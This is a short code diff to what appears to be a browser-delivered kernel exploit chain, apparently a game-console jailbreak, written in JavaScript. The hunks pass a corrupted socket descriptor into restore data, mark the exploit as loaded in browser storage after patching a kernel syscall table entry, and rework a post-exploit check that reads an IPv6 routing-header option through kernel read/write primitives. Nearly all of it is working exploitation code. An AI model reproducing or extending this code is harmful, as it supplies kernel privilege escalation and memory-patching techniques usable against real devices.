@@ -1477,7 +1477,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     // +2 since we have to take into account the fget_write()'s reference
     kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);*/
     
-    return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
+    return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo, dirty_sd]];
 }
 
 // FUNCTIONS FOR STAGE: PATCH KERNEL
@@ -1603,6 +1603,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     kmem.write64(sysent_661.add(8), sy_call);
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
+    
     localStorage.ExploitLoaded="yes"
     sessionStorage.ExploitLoaded="yes";
    //alert("kernel exploit succeeded!");
@@ -1682,19 +1683,18 @@ function verify_post_exploit(kmem, kbase, restore_info) {
     }
 
     try {
-       const [, , , , dirty_sd] = restore_info;
-    const IPPROTO_IPV6 = 41;
-    const IPV6_RTHDR = 51;
-    const rthdr = new Buffer(8);
-    const size = new Word(rthdr.size);
-    sysi("getsockopt", dirty_sd, IPPROTO_IPV6, IPV6_RTHDR, rthdr.addr, size.addr);
-    const val = rthdr.read64(0);
-
-    if (val && typeof val.lo === 'number' && val.lo === 0 && val.hi === 0) {
-        log("✅ ip6po_rthdr è stato correttamente azzerato.");
-    } else {
-        log(`❌ ip6po_rthdr NON è nullo: ${val}`);
-    }
+        const [, , , , dirty_sd] = restore_info;
+        const IPPROTO_IPV6 = 41;
+        const IPV6_RTHDR = 51;
+        const rthdr = new Buffer(8);
+        const size = new Word(rthdr.size);
+        sysi("getsockopt", dirty_sd, IPPROTO_IPV6, IPV6_RTHDR, rthdr.addr, size.addr);
+        const val = rthdr.read64(0);
+        if (val.eq(0)) {
+            log("✅ ip6po_rthdr è stato correttamente azzerato.");
+        } else {
+            log(`❌ ip6po_rthdr NON è nullo: ${val}`);
+        }
     } catch (e) {
         log(`⚠️ Errore nel verificare ip6po_rthdr: ${e}`);
     }
